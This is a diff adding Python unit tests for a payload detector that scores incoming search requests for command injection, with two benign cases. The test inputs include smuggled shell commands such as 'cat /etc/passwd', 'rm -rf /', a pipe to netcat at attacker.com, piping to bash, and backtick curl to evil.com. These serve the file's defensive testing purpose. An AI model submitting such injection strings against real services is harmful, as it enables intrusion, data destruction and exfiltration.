@@ -287,3 +287,123 @@ def test_payload_keeps_search_query_clean():
 
     res = asyncio.run(PayloadSignal().extract(ctx))
     assert res.score == 0.0
+
+
+def test_payload_marks_or_chain_probe_text():
+    ctx = RequestContext(
+        identity="u1",
+        payload="foo || cat /etc/passwd",
+        url="/search",
+        method="POST",
+        headers={},
+        ip="127.0.0.1",
+        endpoint="/search",
+    )
+
+    res = asyncio.run(PayloadSignal().extract(ctx))
+    assert res.score >= 0.7
+
+
+def test_payload_marks_or_chain_rm_probe_text():
+    ctx = RequestContext(
+        identity="u1",
+        payload="1 || rm -rf /",
+        url="/search",
+        method="POST",
+        headers={},
+        ip="127.0.0.1",
+        endpoint="/search",
+    )
+
+    res = asyncio.run(PayloadSignal().extract(ctx))
+    assert res.score >= 0.7
+
+
+def test_payload_marks_pipe_nc_probe_text():
+    ctx = RequestContext(
+        identity="u1",
+        payload="input | nc attacker.com 1234",
+        url="/search",
+        method="POST",
+        headers={},
+        ip="127.0.0.1",
+        endpoint="/search",
+    )
+
+    res = asyncio.run(PayloadSignal().extract(ctx))
+    assert res.score >= 0.7
+
+
+def test_payload_marks_pipe_bash_probe_text():
+    ctx = RequestContext(
+        identity="u1",
+        payload="search | bash",
+        url="/search",
+        method="POST",
+        headers={},
+        ip="127.0.0.1",
+        endpoint="/search",
+    )
+
+    res = asyncio.run(PayloadSignal().extract(ctx))
+    assert res.score >= 0.7
+
+
+def test_payload_marks_backtick_id_probe_text():
+    ctx = RequestContext(
+        identity="u1",
+        payload="`id`",
+        url="/search",
+        method="POST",
+        headers={},
+        ip="127.0.0.1",
+        endpoint="/search",
+    )
+
+    res = asyncio.run(PayloadSignal().extract(ctx))
+    assert res.score >= 0.7
+
+
+def test_payload_marks_backtick_whoami_probe_text():
+    ctx = RequestContext(
+        identity="u1",
+        payload="`whoami`",
+        url="/search",
+        method="POST",
+        headers={},
+        ip="127.0.0.1",
+        endpoint="/search",
+    )
+
+    res = asyncio.run(PayloadSignal().extract(ctx))
+    assert res.score >= 0.7
+
+
+def test_payload_marks_backtick_curl_probe_text():
+    ctx = RequestContext(
+        identity="u1",
+        payload="`curl http://evil.com`",
+        url="/search",
+        method="POST",
+        headers={},
+        ip="127.0.0.1",
+        endpoint="/search",
+    )
+
+    res = asyncio.run(PayloadSignal().extract(ctx))
+    assert res.score >= 0.7
+
+
+def test_payload_keeps_pipe_filter_param_clean():
+    ctx = RequestContext(
+        identity="u1",
+        payload="price|filter=low",
+        url="/products",
+        method="GET",
+        headers={},
+        ip="127.0.0.1",
+        endpoint="/products",
+    )
+
+    res = asyncio.run(PayloadSignal().extract(ctx))
+    assert res.score == 0.0
